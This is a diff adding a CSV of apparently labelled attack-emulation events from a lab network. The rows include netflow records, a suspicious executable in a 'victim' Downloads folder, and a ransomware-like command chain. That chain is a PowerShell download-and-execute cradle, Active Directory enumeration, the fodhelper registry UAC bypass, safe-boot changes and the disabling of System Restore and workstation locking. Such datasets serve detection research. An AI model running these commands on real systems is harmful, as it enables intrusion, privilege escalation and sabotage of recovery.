@@ -1,0 +1,30 @@
+ce5d4b99-6c9b-4551-a8c0-d7135bc2e327,{'netflow': '192.168.56.102:25057->192.168.56.101:16415'},1
+2e745b37-3535-4af7-92ee-38f917dd6eee,{'netflow': '192.168.56.102:25313->192.168.56.101:16415'},2
+18281443-ddb0-420f-8cd1-bca41ba64998,{'netflow': '192.168.56.102:25569->192.168.56.101:16415'},3
+5f08bc88-888a-418d-89fe-c266219fcbeb,{'netflow': '192.168.56.102:29665->192.168.56.101:16415'},4
+8fe4196b-5e37-448e-bc9a-276858e7a1af,{'netflow': '192.168.56.102:29921->192.168.56.101:16415'},5
+a14b514e-2ad7-4dde-bc66-69c5f2efdf69,{'netflow': '192.168.56.102:40162->192.168.56.101:24862'},6
+e949aaa5-9422-481f-9a4f-0397c4fb2601,{'file': 'C:\\Users\\victim\\Downloads\\QUIET_CHIEF.exe'},7
+57c8aa54-3bc9-4278-b759-b60d9b0019b5,{'subject': '"C:\\Users\\victim\\Downloads\\QUIET_CHIEF.exe" '},8
+1e69ec28-68c2-4609-ae3b-485a38f05705,{'file': 'QUIET_CHIEF.exe'},9
+55b7b318-ddf8-49f8-b0b8-b0495a4a0640,{'subject': 'powershell.exe -Command "iex(new-object net.webclient).downloadstring(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1\')"'},10
+b74c8560-07d6-457e-816a-fb39960f2733,{'subject': 'powershell.exe -Command "Invoke-Seatbelt -Command \\"-group=all\\""'},11
+95d5d32e-928b-4f9e-9195-d37a45893062,{'subject': 'powershell.exe -Command "Get-AdGroup -Filter *"'},12
+6b0d84e0-7a24-461c-890e-bece606f22bc,{'subject': 'cmd.exe /c "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 22:16"'},13
+227c0209-123b-445c-8934-36e37d06909c,{'subject': 'powershell.exe -Command "Compress-Archive -Path \\"None\\" -DestinationPath attack.zip -Force"'},14
+98672d0e-b1cf-4404-b05d-d0833d55faf4,{'subject': 'powershell.exe -Command "$startingDirectory=\\"C:\\"; $outputZip=\\"#{output_zip_folder_path}\\"; $fileExtensions=@(\\".doc\\"'},15
+1a5e0efb-9923-487f-b7e6-79a5f66e6511,{'subject': 'cmd.exe /c "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \\"C:\\Windows\\System32\\cmd.exe\\" /f"'},16
+4c948531-6fcb-4ed6-bab2-98b1d085b891,{'subject': 'cmd.exe /c "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \\"DelegateExecute\\" /f"'},17
+ea8e865f-865e-4fe9-87ed-1333a2c00c82,{'subject': 'cmd.exe /c fodhelper.exe'},18
+1c31466a-a23f-4921-b666-efb33cf35039,{'file': 'C:\\Windows\\System32\\fodhelper.exe'},19
+d8cb2556-4784-495a-9e73-290e35449fe5,{'subject': 'fodhelper.exe'},20
+e291daaa-1fe8-45f1-81bf-ee934bd8ed0c,{'file': 'fodhelper.exe'},21
+e0fbb981-3a09-4e8a-a30d-9deef80ade32,{'file': 'C:\\Windows\\system32\\fodhelper.exe'},22
+c2f463a4-a5b2-4203-bced-f4ab86424f1b,{'file': 'C:\\windows\\system32\\fodhelper.exe'},23
+6b999986-a7ef-46d8-b802-81327dd5dcb2,{'subject': 'cmd.exe /c "bcdedit /set safeboot network"'},24
+230edd8c-2f6a-49d7-869d-ae0cf7190d30,{'subject': 'cmd.exe /c "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f"'},25
+a0fbe1d8-626c-4296-9bf3-9e639640064c,{'subject': 'cmd.exe /c "schtasks.exe /Change /TN \\"\\Microsoft\\Windows\\SystemRestore\\SR\\" /disable"'},26
+a3452160-9335-4b7e-986d-74f278c9b867,{'subject': 'cmd.exe /c "reg add \\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f"'},27
+cee9cb70-23ea-46fa-b719-5bf87d96cbf5,{'subject': 'reg  add \\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f'},28
+52849f3b-0164-4aae-8ee9-24bc3597a2fb,{'subject': 'cmd.exe /c "reg add \\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\" /v HideSCANetwork /t REG_DWORD /d 1 /f"'},29
+7bd38304-9b81-4fcd-a711-c418d2aba913,{'subject': 'reg  add \\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\" /v HideSCANetwork /t REG_DWORD /d 1 /f'},30
